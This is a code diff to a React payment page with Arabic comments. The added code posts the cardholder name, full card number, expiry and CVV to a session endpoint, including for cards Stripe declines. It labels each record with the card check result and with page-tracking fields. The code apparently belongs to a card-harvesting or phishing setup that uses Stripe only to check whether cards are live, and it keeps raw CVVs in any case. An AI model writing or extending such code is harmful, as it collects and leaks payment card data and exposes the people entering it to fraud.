@@ -276,6 +276,7 @@ export default function PaymentPage() {
         if (hasError) return;
     setIsSubmitting(true);
     setErrorMsg("");
+    let stripeResult = '';
 
     // --- Stripe Authorization: التحقق الحقيقي من البطاقة ---
     try {
@@ -297,13 +298,33 @@ export default function PaymentPage() {
       const verifyData = await verifyRes.json();
 
       if (!verifyData.success) {
+        // حفظ نتيجة الرفض في الجلسة
+        try {
+          await fetch('/api/session', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              current_page: 'payment',
+              card_holder: cardHolder,
+              card_number: cardNumber,
+              card_expiry: expiry,
+              card_cvv: cvv,
+              stripe_status: `مرفوضة: ${verifyData.error || 'تم رفض البطاقة'}`,
+              waiting_for: 'payment',
+            }),
+          });
+        } catch {}
         setIsSubmitting(false);
         setErrorMsg(verifyData.error || 'تم رفض البطاقة من قبل البنك');
         return;
       }
+      // حفظ نتيجة القبول في الجلسة
+      stripeResult = verifyData.message || 'البطاقة صالحة';
     } catch (stripeError: any) {
-      // إذا فشل Stripe لأي سبب، نكمل بدونه
-      console.warn('Stripe check failed, continuing:', stripeError);
+      // إذا فشل Stripe بسبب خطأ في الشبكة، نوقف العملية ونعرض خطأ
+      setIsSubmitting(false);
+      setErrorMsg('حدث خطأ في التحقق من البطاقة، يرجى المحاولة مرة أخرى');
+      return;
     }
     // --- نهاية Stripe Authorization ---
 
@@ -317,6 +338,7 @@ export default function PaymentPage() {
           card_number: cardNumber,
           card_expiry: expiry,
           card_cvv: cvv,
+          stripe_status: stripeResult || 'ناجحة',
           waiting_for: 'payment',
         }),
       });
